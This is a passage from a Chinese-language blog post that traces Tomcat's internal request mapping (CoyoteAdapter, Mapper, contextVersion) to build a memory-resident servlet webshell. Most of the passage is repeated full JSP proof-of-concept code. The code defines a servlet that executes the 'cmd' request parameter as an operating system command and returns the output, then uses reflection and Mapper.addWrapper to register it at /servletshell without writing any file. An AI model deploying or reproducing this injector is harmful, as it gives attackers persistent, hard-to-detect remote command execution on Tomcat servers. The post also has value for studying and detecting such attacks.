<code>request</code>中获取的，那么我们又要继续追溯 <code>request</code> 对象的来源了，看到<code>org.apache.catalina.connector.CoyoteAdapter#service</code></p>\n<p>这里获取了 <code>request</code> 对象，然后在下面调用了<code>postParseRequest</code> 处理</p>\n<p>跟进</p>\n<p>这里算是一个关键地方，后面就是map方面的操作了</p>\n<p>跟踪到这里，也就是<code>org.apache.catalina.mappe.Mapper#internalMap</code>的时候，发现了一个关键的属性 <code>contextVersion</code></p>\n<p>可以看到 <code>contextVersion</code>中的 <code>exactWrappers</code> 中存储了我们自定义的其他两个servlet的 <code>wrapper</code> ，但是我们动态注入进去的servlet却没有，这貌似也就解释了响应码是404的原因。那么如果我们能将需要注入的servlet的wrapper添加到这里面，就可以成功了呢？说干就干，先找一下有没有方法可以将wrapper插入进去，还真有一个 <code>addWrapper</code> 方法</p>\n<p>要使用这个方法，我们就需要获取到 <code>contextVersion</code> ，还要创建一个自定义的 <code>wrapper</code></p>\n<p>先解决第一个问题 — 获取 <code>contextVersion</code></p>\n<p>无意之间看到了这么一行代码</p>\n<p>然后去看了看 <code>contextObjectToContextVersionMap</code></p>\n<p>里面果然存储了 <code>contextVersion</code> ，那么我们也就可以通过这个属性获取到 <code>contextVersion</code>,那么现在的问题就变成了获取<code>contextObjectToContextVersionMap</code> ，只要我们获取到这个mapper对象，也就可以顺理成章的获取到这个属性。所以问题又变成了获取mapper对象，这时我们看到之前说的那个关键操作点</p>\n<p>这里先获取到service属性在调用 <code>getMapper</code> 获取到 <code>mapper</code> 对象，那么我们现在就要想办法去获取到这个 <code>StandardService</code> ，后面调试了半天，到处追踪，终于看到了希望</p>\n<p>可以看到在 <code>ApplicationContext</code> 中有 <code>service</code> 这个属性，而 <code>ApplicationContext</code> 我们已经能够获取到了，所以问题圆满解决。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//获取service属性</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //调用addWrapper方法</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>继续看第二个问题 — 创建自定义 <code>wrapper</code></p>\n<p>在 <code>StandardContext</code>中，存在 <code>createWrapper</code> 方法，我们可以通过该方法来创建自定义的 <code>wrapper</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//创建自定义wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br></pre></td></tr></table></figure>\n\n<p>然后我们组合一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //修改状态</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //尝试注入</span><br><span class=\"line\">    String servletName=&quot;ServletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    Servletshell shell=new Servletshell();</span><br><span class=\"line\">    //创建自定义wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    //shellWrapper.addMapping(&quot;/servletshell&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取service属性</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //调用addWrapper方法</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>但是访问还是报500，看一下是否将wrapper正确添加了</p>\n<p>可以看到确实将wrapper添加了进去，但是格式不太对，回去看了一下wrapper的属性，原来是没有设置 <code>parent</code> 属性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellWrapper.setParent(standardContext);</span><br></pre></td></tr></table></figure>\n\n<p>添加这一行即可，修改后的poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //修改状态</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //尝试注入</span><br><span class=\"line\">    String servletName=&quot;ServletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    Servletshell shell=new Servletshell();</span><br><span class=\"line\">    //创建自定义wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    shellWrapper.setParent(standardContext);</span><br><span class=\"line\">    //shellWrapper.addMapping(&quot;/servletshell&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取service属性</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //调用addWrapper方法</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>成功注入</p>\n<p>后面测试了一下，前面的 addservlet方法这些不需要执行就能成功，所以最终poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = 